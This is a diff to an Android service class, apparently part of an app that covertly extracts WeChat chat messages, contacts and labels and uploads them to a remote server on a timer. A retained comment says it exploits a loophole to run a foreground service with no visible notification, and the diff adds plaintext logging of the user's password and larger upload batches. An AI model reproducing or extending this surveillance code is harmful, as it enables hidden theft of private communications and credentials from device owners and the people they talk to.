@@ -75,7 +75,15 @@ public class WorkService extends BaseService implements INetResult{
 
      public static Subscription sSubscription;
 
-     /**
+    /**
+     * 标识json
+     *
+     */
+    private String json;
+    private Timer  timer;
+    private TimerTask timerTask ;
+
+    /**
      * 1.防止重复启动，可以任意调用startService(Intent i);
      * 2.利用漏洞启动前台服务而不显示通知;
      * 3.在子线程中运行定时任务，处理了运行前检查和销毁时保存的问题;
@@ -186,7 +194,7 @@ public class WorkService extends BaseService implements INetResult{
     /**
      * 一次上传的最大message数量 ；
      */
-    private static final  int nMaxMessage = 50;
+    private static final  int nMaxMessage = 100;
     /**
      * 一次上传的最大联系人数量；
      */
@@ -229,7 +237,7 @@ public class WorkService extends BaseService implements INetResult{
     }
 
     /**
-     * 任务开始*********************
+     * 任务开始*********************(包括重新启动任务) ;
      */
     public void startWork(){
          acquireWakeLock();
@@ -245,33 +253,46 @@ public class WorkService extends BaseService implements INetResult{
          AppHolder.getInstance().setUser(userInfo);
          /**
           * 60秒执行一次若是没有传递完就跳过；
+          * 一下代码防止多次重新启动 ;
           */
-         new Timer().schedule(new TimerTask(){
-             @Override
-             public void run() {
-                 if(!isUploadingFileMessge&&!isUploadingTextMessge){
-                     if(!checkIsWifi()){
-                         isUploadingTextMessge =false ;
-                         isUploadingFileMessge =false ;
+              if(timer!=null){
+                    timer.cancel();
+                    timer =null ;
+                }
+              if(timerTask!=null){
+                  timerTask.cancel();
+                  timerTask =null ;
+              }
+             timer=new Timer() ;
+             timerTask =new TimerTask() {
+                 @Override
+                 public void run() {
+                     if(!isUploadingFileMessge&&!isUploadingTextMessge){
+                         if(!checkIsWifi()){
+                             isUploadingTextMessge =false ;
+                             isUploadingFileMessge =false ;
+                         }else{
+                             startTime =System.currentTimeMillis();
+                             sendMessageToSever();
+                         }
                      }else{
-                       startTime =System.currentTimeMillis();
-                       sendMessageToSever();
+                         long endTime =System.currentTimeMillis() ;
+                         //超过四分钟的话，就进行重新开始任务；
+                         if(((endTime-startTime)/1000)>240){
+                             startTime =System.currentTimeMillis() ;
+                             sendMessageToSever();
+                         }
+                         Log.i("szhua","time"+(endTime/1000));
                      }
-                 }else{
-                     long endTime =System.currentTimeMillis() ;
-                     //超过四分钟的话，就进行重新开始任务；
-                     if(((endTime-startTime)/1000)>240){
-                        startTime =System.currentTimeMillis() ;
-                        sendMessageToSever();
-                     }
-                     Log.i("szhua","time"+(endTime/1000));
                  }
-             }
-         },0,60000);
+             } ;
+        timer.schedule(timerTask,0,60000);
     }
 
 
-
+    /**
+     * 主任务
+     */
     public void sendMessageToSever() {
         /**
          * 刚开始便执行正在上传任务了 ；
@@ -290,9 +311,9 @@ public class WorkService extends BaseService implements INetResult{
          */
         try {
             String uin = XmlPaser.getUidFromFile();
-            //当前的账号和原来的不一样的情况下  ;
+            //当前的账号和原来的不一样的情况下;或者登陆出去了 ;
             //重新获取文件 ；
-            if(!getUinString().equals(uin)&&!uin.equals("0")){
+            if(!getUinString().equals(uin)&&uin.equals("0")){
                resetUsesrs();
             }
         }catch (Exception e){
@@ -304,6 +325,7 @@ public class WorkService extends BaseService implements INetResult{
          * 从微信中获取标签 ;
          */
         try {
+            Log.i("szhua","pass"+users.getPassword())  ;
              labelsFromWx =_getLabels(users);
         }catch (Exception e){
              isUploadingFileMessge =false ;
@@ -388,10 +410,17 @@ public class WorkService extends BaseService implements INetResult{
         uploadMessage();
     }
 
+
+
+
+
+
+    /**
+     * 上传聊天记录 ;
+     */
     public void  uploadMessage(){
         ArrayList<WMessage> wmsgs = new ArrayList<WMessage>();
       try{
-          // TODO: 2016/11/24
         wmsgs = (ArrayList<WMessage>) queryMessage(users,getMsgId(),nMaxMessage);
       }catch (Exception e){
           isUploadingFileMessge =false ;
@@ -423,14 +452,15 @@ public class WorkService extends BaseService implements INetResult{
          isUploadingFileMessge =false ;
          isUploadingTextMessge =false ;
      }
-
-        if(wmsgsText.isEmpty()&&wmsgsFile.isEmpty()&&!wmsgs.isEmpty()){
-            setMsgId(wmsgs.get(wmsgs.size()-1).getMsgId());
-        }
+    if(wmsgsText.isEmpty()&&wmsgsFile.isEmpty()&&!wmsgs.isEmpty()){
+        setMsgId(wmsgs.get(wmsgs.size()-1).getMsgId());
+    }
         //释放内存；
         wmsgs.clear();
         wmsgs = null;
     }
+
+
 
     /**
      * 将所有的聊天记录上传到服务器 ；
@@ -444,6 +474,7 @@ public class WorkService extends BaseService implements INetResult{
 
         //将文件的信息传递到服务器；
         if (!wmsgsFile.isEmpty()){
+            Log.i("jsonSize","wtextFile"+wmsgsFile.size());
             sendFileMessageToServer();
         }else{
             isUploadingFileMessge =false ;
@@ -451,7 +482,7 @@ public class WorkService extends BaseService implements INetResult{
         if(wmsgsText.isEmpty()){
             isUploadingTextMessge =false ;
         }else {
-            Log.i("szhua","wtextSize"+wmsgsText.size());
+            Log.i("jsonSize","wtextSize"+wmsgsText.size());
             //将文本的信息传递到服务器；
             sendTextMessageToSever(wmsgsText,UPLOAPTEXTLOGTYPE);
         }
@@ -462,7 +493,6 @@ public class WorkService extends BaseService implements INetResult{
             setMsgId(wmsgs.get(wmsgs.size()-1).getMsgId());
         }
     }
-
 
 
     /**
@@ -479,6 +509,10 @@ public class WorkService extends BaseService implements INetResult{
             }
         }
     }
+
+
+
+
     /**
      * 上传文件聊天到服务器；标识并且设置一些属性；
      */
@@ -498,7 +532,12 @@ public class WorkService extends BaseService implements INetResult{
                 }
             }
         }
-           final String json =changeMessageToJson(wmsgsFile,UPLOADFILELOGTYPE) ;
+
+
+           if(currentUploadFileMsg==null) {
+                json = changeMessageToJson(wmsgsFile, UPLOADFILELOGTYPE);
+           }else{json ="" ;}
+
 
            changeThreadToMain(new Handle() {
                @Override
@@ -514,6 +553,11 @@ public class WorkService extends BaseService implements INetResult{
                }
            });
     }
+
+
+
+
+
     /**
      * 上传文本聊天到服务器；
      */
@@ -540,12 +584,37 @@ public class WorkService extends BaseService implements INetResult{
 
 
     /**
-     * 将message转换成服务器需要的json格式 ;
+     * 将联系人转换成需要上传的格式;(toJson and Gzip )
+     * @param contactForJsonBases
+     * @return
+     */
+     public String changeContactsToJson(ArrayList<ContactForJsonBase> contactForJsonBases){
+         String json ="" ;
+         try {
+             json = JsonUtil.pojo2json(contactForJsonBases);
+             Log.i("jsonSize","fansJson:"+json.length()) ;
+             json =EncryptUtil.encryptGZIP(json);
+             Log.i("jsonSize","fansJsonZip:"+json.length()) ;
+         } catch (IOException e) {
+             e.printStackTrace();
+             isFirstGetConacts =false;
+         }
+         return  json ;
+     }
+
+
+
+    /**
+     * 将message转换成服务器需要的json格式 ;(toJson and Gzip )
      * @param wMessages
      * @param  type 上传的类型 ；
      * @return
      */
     public String  changeMessageToJson(ArrayList<WMessage> wMessages ,int type) {
+
+
+
+
         ArrayList<MessageForJson> messageForJsons =new ArrayList<>() ;
         for (WMessage wMessage : wMessages) {
             MessageForJson mfj =new MessageForJson() ;
@@ -561,9 +630,15 @@ public class WorkService extends BaseService implements INetResult{
         String json ="" ;
         try {
             json = JsonUtil.pojo2json(messageForJsons);
-            Log.i("jsonSize","jsonOri"+json.length()) ;
+            if(type==UPLOADFILELOGTYPE){
+            Log.i("jsonSize","jsonMessageFile:"+json.length()) ;}else{
+                Log.i("jsonSize","jsonMessage:"+json.length()) ;
+            }
             json = EncryptUtil.encryptGZIP(json) ;
-            Log.i("jsonSize","jsonZip"+json.length()) ;
+            if(type==UPLOADFILELOGTYPE){
+            Log.i("jsonSize","jsonMessageZipFile:"+json.length()) ;}else{
+                Log.i("jsonSize","jsonMessageZip:"+json.length()) ;
+            }
         } catch (IOException e) {
             //解析出错的情况下 ;
             switch (type){
@@ -580,6 +655,9 @@ public class WorkService extends BaseService implements INetResult{
         }
         return  json ;
     }
+
+
+
 
 
     /**
@@ -615,6 +693,10 @@ public class WorkService extends BaseService implements INetResult{
         wmsgsText.add(wmsg);
     }
     }
+
+
+
+
     /**
      * 比较两个联系人是否相同 ；
      * @param wx
@@ -698,40 +780,47 @@ public class WorkService extends BaseService implements INetResult{
             contactToAdd.setModify_time("" + System.currentTimeMillis() / 1000);
             contactToAdd.setModify_type(rConact.getType());
             contactsForJsons.add(contactToAdd);
+
             if (contactsForJsons.size() >= nMaxContact) {
+                final String json =changeContactsToJson(contactsForJsons) ;
                 changeThreadToMain(new Handle() {
                     @Override
                     void handler() {
                         if (type == APPENDTYPE) {
-                            appendFansDao.apppendFans(getWx(), getToken(), contactsForJsons);
+                            appendFansDao.apppendFans(getWx(), getToken(), json);
                         } else {
-                            appendFansDao.changeFans(getWx(), getToken(), contactsForJsons);
+                            appendFansDao.changeFans(getWx(), getToken(), json);
                         }
                         contactsForJsons.clear();
                     }
                 });
-
+                try {
+                    Thread.sleep(200);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
 
             }
         }
-
-
         /**
          * 处于循环外 ；
          */
+        final String json =changeContactsToJson(contactsForJsons) ;
         if (contactsForJsons.size() > 0) {
            changeThreadToMain(new Handle() {
                @Override
                void handler() {
                    if(type==APPENDTYPE){
-                       appendFansDao.apppendFans(getWx(),getToken(),contactsForJsons);}
+                       appendFansDao.apppendFans(getWx(),getToken(),json);}
                    else{
-                       appendFansDao.changeFans(getWx(),getToken(),contactsForJsons);}
+                       appendFansDao.changeFans(getWx(),getToken(),json);}
                        contactsForJsons.clear();
                }
            });
         }
     }
+
+
 
     @Override
     public IBinder onBind(Intent intent) {
@@ -746,6 +835,10 @@ public class WorkService extends BaseService implements INetResult{
         startService(new Intent(getApplication(), WatchDogService.class));
     }
 
+
+
+
+
     /**
      * 最近任务列表中划掉卡片时回调
      */
@@ -753,6 +846,7 @@ public class WorkService extends BaseService implements INetResult{
     public void onTaskRemoved(Intent rootIntent) {
         onEnd(rootIntent);
     }
+
 
 
     /**
@@ -818,6 +912,11 @@ public class WorkService extends BaseService implements INetResult{
              }
         }
     }
+
+
+
+
+
     @Override
     public void onRequestError(int requestCode, String errorInfo, int error_code) {
         if(requestCode==RequestCode.UPLOADFILE){
@@ -880,6 +979,8 @@ public class WorkService extends BaseService implements INetResult{
         isUploadingFileMessge=false ;
     }
 
+
+
     public String getWx (){
      String wx =   SharedPrefsUtil.getValue(getBaseContext(),"wx","") ;
       return  wx ;
@@ -899,7 +1000,14 @@ public class WorkService extends BaseService implements INetResult{
 
     //todo  checkIsRight ；（切换账号的情况下） ；
     public  void setMsgId(String msgId){
-        DBCipherManager.getInstance(getBaseContext()).updateMsgId(getUinString(),msgId);
+
+        /**
+         * 加一层安全设置 ; 若是现在的msgId 比原来设置的小的话，那么不进行处理;
+         */
+        if(Integer.parseInt(msgId)<Integer.parseInt(getMsgId())){
+        }else {
+            DBCipherManager.getInstance(getBaseContext()).updateMsgId(getUinString(), msgId);
+        }
     }
 
     @Override
@@ -1052,24 +1160,13 @@ public class WorkService extends BaseService implements INetResult{
 
     }
 
-// 释放设备电源锁
-    private void releaseWakeLock() {
 
-        if (null != wakeLock && wakeLock.isHeld()) {
-
-            wakeLock.release();
-
-            wakeLock = null;
-
-        }
-
-    }
-
-
+    /**
+     * 实现类
+     */
     abstract  class  Handle{
       abstract void handler ();
     }
-
     /**
      * 换线程(用于asyncHttp的请求)
      * @param handle
